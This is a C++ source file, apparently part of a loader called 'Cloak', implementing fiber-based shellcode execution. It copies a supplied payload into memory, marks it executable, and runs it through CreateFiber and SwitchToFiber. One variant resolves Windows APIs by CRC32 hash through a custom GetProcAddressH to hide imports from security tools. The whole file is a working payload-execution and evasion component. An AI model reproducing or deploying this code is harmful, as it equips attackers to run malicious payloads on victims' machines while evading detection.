#include "Cloak.hpp"

#ifdef FIBERS

#ifdef HASH_API
#include "Hash.hpp"
#include "Defs.hpp"

BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = ( HMODULE ) LdrLoadDll( L"KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnConvertThreadToFiber pConvertThreadToFiber = ( fnConvertThreadToFiber ) GetProcAddressH( hKernel32, ConvertThreadToFiber_CRC32A );
    if ( pConvertThreadToFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pConvertThreadToFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnDeleteFiber pDeleteFiber = ( fnDeleteFiber ) GetProcAddressH( hKernel32, DeleteFiber_CRC32A );
    if ( pDeleteFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pDeleteFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnConvertFiberToThread pConvertFiberToThread = ( fnConvertFiberToThread ) GetProcAddressH( hKernel32, ConvertFiberToThread_CRC32A );
    if ( pConvertFiberToThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pConvertFiberToThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateFiber pCreateFiber = ( fnCreateFiber ) GetProcAddressH( hKernel32, CreateFiber_CRC32A );
    if ( pCreateFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pCreateFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnSwitchToFiber pSwitchToFiber = ( fnSwitchToFiber ) GetProcAddressH( hKernel32, SwitchToFiber_CRC32A );
    if ( pSwitchToFiber == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pSwitchToFiber\n" );
        #endif // !DEBUG
        
        return FALSE;
    }
    
    //---
    
    PVOID pPayloadAddress   = NULL;
    PVOID pPayloadFiber     = NULL;
    PVOID pMainFiber        = NULL;
    DWORD dwOldProtect      = NULL;
    
    pMainFiber = pConvertThreadToFiber( NULL );
    if ( ! pMainFiber ) {
        #ifdef DEBUG
        printf( "[-] ConvertThreadToFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( 0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        pDeleteFiber(pMainFiber);
        pConvertFiberToThread();
        
        return FALSE;
    }

    memcpy(pPayloadAddress, pbPayload, sPayloadSize);

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadFiber = pCreateFiber(NULL, ( LPFIBER_START_ROUTINE ) pPayloadAddress, NULL );
    if ( ! pPayloadFiber ) {
        #ifdef DEBUG
        printf( "[-] CreateFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        pDeleteFiber(pMainFiber);
        pConvertFiberToThread();

        return FALSE;
    }

    pSwitchToFiber(pPayloadFiber);

    return TRUE;
}

#else

BOOL FiberExec(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    PVOID pPayloadAddress   = NULL;
    PVOID pPayloadFiber     = NULL;
    PVOID pMainFiber        = NULL;
    DWORD dwOldProtect      = NULL;
    
    pMainFiber = ConvertThreadToFiber( NULL );
    if ( ! pMainFiber ) {
        #ifdef DEBUG
        printf( "[-] ConvertThreadToFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( 0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        DeleteFiber(pMainFiber);
        ConvertFiberToThread();
        
        return FALSE;
    }

    memcpy(pPayloadAddress, pbPayload, sPayloadSize);

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadFiber = CreateFiber(NULL, ( LPFIBER_START_ROUTINE ) pPayloadAddress, NULL );
    if ( ! pPayloadFiber ) {
        #ifdef DEBUG
        printf( "[-] CreateFiber Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        DeleteFiber(pMainFiber);
        ConvertFiberToThread();

        return FALSE;
    }

    SwitchToFiber(pPayloadFiber);

    return TRUE;
}

#endif // !HASH_API

#endif // !FIBERS